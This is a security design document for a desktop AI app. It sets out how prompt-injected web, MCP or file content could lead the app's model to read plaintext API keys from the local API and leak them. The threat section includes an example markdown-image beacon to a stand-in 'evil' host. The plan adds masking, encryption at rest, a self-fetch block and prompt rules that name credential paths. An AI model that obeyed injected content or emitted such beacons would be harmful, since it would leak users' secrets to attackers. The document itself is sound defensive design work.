# Secrets at rest and prompt-injection exfiltration — design

Status: agreed in conversation on 2026-09-25 (items 1–4 from the threat walk-through, plus encryption at rest:
"按 1 到 4 写设计吧, 但我还是觉得既然做了, 那就把 safeStorage 一起做了"). Reference: `docs/security-hardening.md`.

## 1. Threat

Untrusted content reaches the model — web pages (`web_fetch`, `web_search`, deep research), MCP results, files it
reads, installed skills, screen content in computer use. A prompt injection can then (a) **read** secrets — the local
API returns every provider key in plaintext to any loopback caller, and `web_fetch` / `terminal` are loopback callers
— and (b) **exfiltrate** them — a `web_fetch` / `web_search` query, `terminal`, or with no tool at all: a markdown
image `![](https://evil/?k=…)` in the reply, which the renderer loads because the CSP says `img-src *`.

`terminal` / `read_file` can still read anything the user can; this design does not sandbox them (future: an approval
mode, a loopback API token). It removes the easy paths: no plaintext secret over the API, no silent image beacon, no
self-API via `web_fetch`, an explicit hard stop in the prompt, and nothing readable at rest.

## 2. Changes

### 2.1 Remote images in chat load on tap (renderer)

`markdown.tsx`'s `img`: `data:` URLs, the app's own media route (`/api/v1/media/…`) and images from the run's own web
search results load as today; any other remote `src` renders a placeholder with the host name and a "Load image"
button (per image, per session). Link clicks are unchanged (they already open externally through
`openExternalSafely`). The CSP keeps `img-src *` (the gate is the component; a CSP cannot express click-to-load) —
documented. exodus-ios already works this way (`MarkdownImagePolicy`).

### 2.2 Secrets never leave the main process in plaintext (API)

- **Registry:** one list of secret fields — `providers.{openaiApiKey, azureOpenaiApiKey, anthropicApiKey,
googleGeminiApiKey, xAiApiKey}`, `googleCloud.googleApiKey`, `webSearch.braveApiKey`, `fullTextSearch.elasticsearch
.password`, `knowledgeBase.apiKey`, `s3.{accessKeyId, secretAccessKey}`, every other key-like field the schema holds
  (the implementer greps the schema and the Settings pages; a test fails when a new `*Key|*Secret|*Password|*Token`
  field is added without a registry decision), plus `mcp_server.env` / `headers` values.
- **Reads:** `GET /api/v1/settings` and `GET /api/v1/mcp` return a secret as a mask `"•••• abcd"` (last 4, or `"••••"`
  when shorter than 12) — never the value. Main-process code (providers, tools, jobs) reads secrets through the
  in-process settings (unchanged call sites; `getSettings()` keeps returning plaintext inside main).
- **Writes:** a posted value equal to the current mask means "unchanged"; `null` / `""` clears; anything else sets.
  This keeps the desktop autosave (which posts whole sections) and exodus-ios (column read-modify-write) working
  without knowing about masks. The desktop key inputs show the mask and replace it on focus-and-type; iOS
  `SecureField`s keep working (they post the mask back untouched).
- **List-models:** `POST /api/v1/settings/models` already takes the key from the request; when the request carries a
  mask, the server substitutes the stored key.

### 2.3 Secrets encrypted at rest (safeStorage)

- Values in the registry are stored as `enc:v1:<base64>` from Electron `safeStorage.encryptString` (macOS Keychain /
  Windows DPAPI / Linux libsecret). Encrypt on write, decrypt when settings are loaded into the in-process cache.
- **Migration at startup** (idempotent): plaintext registry values are encrypted in place; a value already prefixed
  is left alone. Logged once, values never logged.
- **Unavailable safeStorage** (Linux without a keyring, `getSelectedStorageBackend() === 'basic_text'`): keep plaintext,
  log a warning once, show a Settings notice; never block the app.
- **Decrypt failure** (a different machine, a changed code-signing identity, a restored backup from elsewhere): the
  field reads as unset, a Settings notice says which keys need re-entering; never crash, never send the ciphertext as
  a key.
- **Backups / export:** `~/.exodus/backups` dumps carry ciphertext (fine on the same machine). `db-io` export: check
  whether settings are exported; if they are, export secrets **masked out** (not plaintext, not ciphertext) and say so
  in the export UI copy.
- CLAUDE.md's "When a Developer ID exists" checklist already lists safeStorage data; add the settings secrets to it.

### 2.4 `web_fetch` cannot reach Exodus itself

`web_fetch` (and deep research's page fetch, if it has its own) refuses a URL whose host resolves to a loopback or
local-interface address **and** whose port is `SERVER_PORT` (60223) or `LAN_SERVER_PORT` (63129) — including
`localhost`, `127.0.0.1`, `[::1]`, `0.0.0.0` and this machine's LAN IPs — checked on every redirect hop. Other local and
LAN services stay reachable (the user's intranet use case). Reuse `src/main/lib/net/safe-fetch.ts`'s resolution helpers.

### 2.5 Prompt hard stops

Add to `<hard_stops>` in `prompts.ts`: ask before (a) reading credential stores or secrets — `~/.ssh`, `~/.aws`,
`~/.config/**/credentials`, keychains, `~/.exodus` data files, `.env` files outside the workspace — and (b) sending
data from this machine to a third party that the user did not ask for (a URL carrying local data, an upload, a paste
service). Keep it short, in the prompt's voice; `prompts.test.ts` pins the lines.

## 3. Out of scope (recorded as open items)

A loopback API token for the renderer; a terminal approval mode; sandboxing `read_file`; DNS-rebinding hardening of
`web_fetch` beyond the port rule; encrypting non-secret data.

## 4. Testing

- Renderer: remote image placeholder + tap-to-load; local media / data / search-result images load; memoized, no
  render-path regression.
- API: secrets masked in GET /settings and GET /mcp (every registry field); mask round-trip keeps the value; clear;
  set; list-models substitutes a mask; the registry-coverage test.
- safeStorage: encrypt-on-write, decrypt-on-load, startup migration idempotent, unavailable backend → plaintext +
  notice, decrypt failure → unset + notice (safeStorage mocked; PGlite real).
- web_fetch: own ports on loopback / LAN IP / localhost / redirect refused; another local port allowed.
- Prompt: the hard-stop lines present.
- exodus-ios: Providers page with masked values — display, unchanged save, replace (a small iOS task after the desktop
  lands).
